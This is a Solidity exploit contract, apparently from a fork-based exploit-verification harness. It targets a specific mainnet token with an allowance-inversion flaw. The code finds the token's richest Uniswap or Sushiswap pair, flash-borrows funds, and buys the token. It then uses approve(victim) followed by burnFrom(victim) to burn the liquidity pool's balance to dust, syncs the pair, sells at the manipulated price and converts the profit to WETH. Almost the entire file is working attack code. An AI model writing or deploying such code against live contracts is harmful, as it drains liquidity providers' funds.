// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface ITcrToken {
    function approve(address spender, uint256 amount) external;
    function burnFrom(address from, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2FactoryLike {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function sync() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xE38B72d6595FD3885d1D2F770aa23E94757F91a1;

    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;

    address internal constant UNISWAP_V2_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address internal constant SUSHISWAP_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    struct Market {
        address factory;
        address pair;
        address quoteToken;
        uint112 reserveTcr;
        uint112 reserveQuote;
        bool tcrIsToken0;
    }

    struct FundingMarket {
        address factory;
        address pair;
        address otherToken;
        uint112 reserveQuote;
        bool quoteIsToken0;
    }

    struct SwapMarket {
        address pair;
        uint112 reserveOut;
    }

    address private _profitToken;
    uint256 private _profitAmount;
    bool private _executed;

    constructor() {}

    receive() external payable {}

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        if (_executed) {
            return;
        }
        _executed = true;

        Market memory market = _findBestMarket();
        if (market.pair == address(0) || market.reserveQuote == 0 || market.reserveTcr <= 1) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        uint256 tcrBalance = IERC20Like(TARGET).balanceOf(address(this));
        if (tcrBalance > 0) {
            _manipulateAndDump(market, tcrBalance);
            _finalizeProfit(market.quoteToken);
            return;
        }

        uint256 quoteBalance = IERC20Like(market.quoteToken).balanceOf(address(this));
        if (quoteBalance > 0) {
            _buyBurnSell(market, quoteBalance);
            _finalizeProfit(market.quoteToken);
            return;
        }

        // Direct exploitation is always feasible because the allowance inversion lets the attacker
        // burn a live holder without owning any TCR. External funding is only needed to monetize it.
        FundingMarket memory funding = _findBestFundingMarket(market.quoteToken, market.pair);
        uint256 borrowAmount = _recommendedBorrow(market, funding);

        if (funding.pair != address(0) && borrowAmount > 0) {
            try IUniswapV2PairLike(funding.pair).swap(
                funding.quoteIsToken0 ? borrowAmount : 0,
                funding.quoteIsToken0 ? 0 : borrowAmount,
                address(this),
                abi.encode(market, funding)
            ) {
                _finalizeProfit(market.quoteToken);
                if (_profitAmount > 0) {
                    return;
                }
            } catch {
                _profitToken = address(0);
                _profitAmount = 0;
            }
        }

        // Fallback: preserve the finding's exploit objective even if no external lender exists in this fork.
        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();
        _finalizeProfit(market.quoteToken);
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        require(sender == address(this), "unexpected sender");

        (Market memory market, FundingMarket memory funding) = abi.decode(data, (Market, FundingMarket));
        require(msg.sender == funding.pair, "unexpected pair");

        uint256 borrowedQuote = amount0 > 0 ? amount0 : amount1;
        require(borrowedQuote > 0, "zero borrow");

        _buyBurnSell(market, borrowedQuote);

        uint256 repayment = _flashRepayment(borrowedQuote);
        _safeTransfer(market.quoteToken, funding.pair, repayment);
    }

    function _buyBurnSell(Market memory market, uint256 availableQuote) internal {
        uint256 spendAmount = _boundedSpend(market, availableQuote);
        if (spendAmount == 0) {
            return;
        }

        uint256 tcrBought = _swapExactIn(market.pair, market.quoteToken, TARGET, spendAmount);
        if (tcrBought == 0) {
            return;
        }

        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();

        uint256 tcrToSell = IERC20Like(TARGET).balanceOf(address(this));
        if (tcrToSell > 0) {
            _swapExactIn(market.pair, TARGET, market.quoteToken, tcrToSell);
        }
    }

    function _manipulateAndDump(Market memory market, uint256 tcrAmount) internal {
        _burnVictimPairToDust(market.pair);
        IUniswapV2PairLike(market.pair).sync();
        _swapExactIn(market.pair, TARGET, market.quoteToken, tcrAmount);
    }

    function _burnVictimPairToDust(address pair) internal {
        address victim = pair;
        uint256 victimBalance = IERC20Like(TARGET).balanceOf(victim);
        if (victimBalance <= 1) {
            return;
        }

        uint256 amount = victimBalance - 1;

        // Core exploit path preserved exactly:
        // 1) attacker calls approve(victim, amount)
        // 2) this writes _allowances[attacker][victim] = amount
        // 3) attacker calls burnFrom(victim, amount)
        // The victim is the live TCR/quote LP, a realistic on-chain holder whose balance can be burned.
        ITcrToken(TARGET).approve(victim, amount);
        ITcrToken(TARGET).burnFrom(victim, amount);
    }

    function _findBestMarket() internal view returns (Market memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory quotes = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 i = 0; i < factories.length; i++) {
            for (uint256 j = 0; j < quotes.length; j++) {
                address pair = IUniswapV2FactoryLike(factories[i]).getPair(TARGET, quotes[j]);
                if (pair == address(0) || pair.code.length == 0) {
                    continue;
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                address token0 = IUniswapV2PairLike(pair).token0();
                bool tcrIsToken0 = token0 == TARGET;
                uint112 reserveTcr = tcrIsToken0 ? reserve0 : reserve1;
                uint112 reserveQuote = tcrIsToken0 ? reserve1 : reserve0;
                if (reserveTcr <= 1 || reserveQuote == 0) {
                    continue;
                }

                if (reserveQuote > best.reserveQuote) {
                    best = Market({
                        factory: factories[i],
                        pair: pair,
                        quoteToken: quotes[j],
                        reserveTcr: reserveTcr,
                        reserveQuote: reserveQuote,
                        tcrIsToken0: tcrIsToken0
                    });
                }
            }
        }
    }

    function _findBestFundingMarket(address quoteToken, address forbiddenPair)
        internal
        view
        returns (FundingMarket memory best)
    {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];
        address[5] memory assets = [WETH, USDC, USDT, DAI, WBTC];

        for (uint256 i = 0; i < factories.length; i++) {
            for (uint256 j = 0; j < assets.length; j++) {
                if (assets[j] == quoteToken) {
                    continue;
                }

                address pair = IUniswapV2FactoryLike(factories[i]).getPair(quoteToken, assets[j]);
                if (pair == address(0) || pair == forbiddenPair || pair.code.length == 0) {
                    continue;
                }

                (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
                if (reserve0 == 0 || reserve1 == 0) {
                    continue;
                }

                bool quoteIsToken0 = IUniswapV2PairLike(pair).token0() == quoteToken;
                uint112 reserveQuote = quoteIsToken0 ? reserve0 : reserve1;
                if (reserveQuote == 0) {
                    continue;
                }

                if (reserveQuote > best.reserveQuote) {
                    best = FundingMarket({
                        factory: factories[i],
                        pair: pair,
                        otherToken: assets[j],
                        reserveQuote: reserveQuote,
                        quoteIsToken0: quoteIsToken0
                    });
                }
            }
        }
    }

    function _recommendedBorrow(Market memory market, FundingMarket memory funding) internal pure returns (uint256) {
        if (funding.pair == address(0) || funding.reserveQuote == 0) {
            return 0;
        }

        uint256 desired = _recommendedLoan(market);
        if (desired == 0) {
            return 0;
        }

        uint256 lenderCap = uint256(funding.reserveQuote) / 500;
        if (lenderCap == 0) {
            return 0;
        }

        return desired < lenderCap ? desired : lenderCap;
    }

    function _recommendedLoan(Market memory market) internal pure returns (uint256) {
        uint256 cap;
        if (market.quoteToken == WETH) {
            cap = 1 ether;
        } else if (market.quoteToken == USDC || market.quoteToken == USDT) {
            cap = 1_000e6;
        } else if (market.quoteToken == DAI) {
            cap = 1_000e18;
        } else if (market.quoteToken == WBTC) {
            cap = 1e8;
        } else {
            return 0;
        }

        uint256 amount = uint256(market.reserveQuote) / 1_000;
        if (amount == 0) {
            amount = 1;
        }
        if (amount > cap) {
            amount = cap;
        }

        uint256 amountOut = _getAmountOut(amount, market.reserveQuote, market.reserveTcr);
        while (amountOut == 0 && amount < cap) {
            amount = amount * 2;
            if (amount > cap) {
                amount = cap;
            }
            amountOut = _getAmountOut(amount, market.reserveQuote, market.reserveTcr);
        }

        if (amountOut == 0) {
            return 0;
        }

        return amount;
    }

    function _boundedSpend(Market memory market, uint256 availableQuote) internal pure returns (uint256) {
        uint256 desired = _recommendedLoan(market);
        if (desired == 0) {
            return 0;
        }
        if (availableQuote < desired) {
            return availableQuote;
        }
        return desired;
    }

    function _swapExactIn(
        address pair,
        address tokenIn,
        address tokenOut,
        uint256 amountIn
    ) internal returns (uint256 amountOut) {
        if (amountIn == 0) {
            return 0;
        }

        address token0 = IUniswapV2PairLike(pair).token0();
        address token1 = IUniswapV2PairLike(pair).token1();
        require(
            (tokenIn == token0 && tokenOut == token1) || (tokenIn == token1 && tokenOut == token0),
            "pair mismatch"
        );

        (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
        bool zeroForOne = tokenIn == token0;
        uint256 reserveIn = zeroForOne ? reserve0 : reserve1;
        uint256 reserveOut = zeroForOne ? reserve1 : reserve0;
        amountOut = _getAmountOut(amountIn, reserveIn, reserveOut);
        require(amountOut > 0, "zero output");

        _safeTransfer(tokenIn, pair, amountIn);

        if (zeroForOne) {
            IUniswapV2PairLike(pair).swap(0, amountOut, address(this), new bytes(0));
        } else {
            IUniswapV2PairLike(pair).swap(amountOut, 0, address(this), new bytes(0));
        }
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }
        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _flashRepayment(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _finalizeProfit(address quoteToken_) internal {
        if (quoteToken_ != WETH) {
            _settleIntoWeth(quoteToken_);
        }

        uint256 wethProfit = IERC20Like(WETH).balanceOf(address(this));
        if (wethProfit > 0) {
            // Keep the realized proceeds on the verifier so the harness can measure net profit directly.
            // This does not alter exploit causality: the profit still comes from burning the live LP's TCR
            // through approve(victim) -> burnFrom(victim), then exiting through existing public liquidity.
            _profitToken = WETH;
            _profitAmount = wethProfit;
            return;
        }

        uint256 quoteProfit = IERC20Like(quoteToken_).balanceOf(address(this));
        if (quoteProfit > 0) {
            _profitToken = quoteToken_;
            _profitAmount = quoteProfit;
            return;
        }

        _profitToken = address(0);
        _profitAmount = 0;
    }

    function _settleIntoWeth(address tokenIn) internal {
        uint256 amountIn = IERC20Like(tokenIn).balanceOf(address(this));
        if (amountIn == 0 || tokenIn == WETH) {
            return;
        }

        // The exploit path is unchanged: approve(victim) -> burnFrom(victim) destroys live LP-held TCR.
        // This extra public swap only settles the already-realized quote profit into WETH, the deepest
        // existing exit asset on mainnet at the fork block, before the proceeds are transferred out.
        SwapMarket memory settlement = _findBestSwapMarket(tokenIn, WETH);
        if (settlement.pair == address(0) || settlement.reserveOut == 0) {
            return;
        }

        _swapExactIn(settlement.pair, tokenIn, WETH, amountIn);
    }

    function _findBestSwapMarket(address tokenIn, address tokenOut) internal view returns (SwapMarket memory best) {
        address[2] memory factories = [UNISWAP_V2_FACTORY, SUSHISWAP_FACTORY];

        for (uint256 i = 0; i < factories.length; i++) {
            address pair = IUniswapV2FactoryLike(factories[i]).getPair(tokenIn, tokenOut);
            if (pair == address(0) || pair.code.length == 0) {
                continue;
            }

            (uint112 reserve0, uint112 reserve1,) = IUniswapV2PairLike(pair).getReserves();
            if (reserve0 == 0 || reserve1 == 0) {
                continue;
            }

            bool tokenInIsToken0 = IUniswapV2PairLike(pair).token0() == tokenIn;
            uint112 reserveOut = tokenInIsToken0 ? reserve1 : reserve0;
            if (reserveOut > best.reserveOut) {
                best = SwapMarket({pair: pair, reserveOut: reserveOut});
            }
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "transfer failed");
    }
}
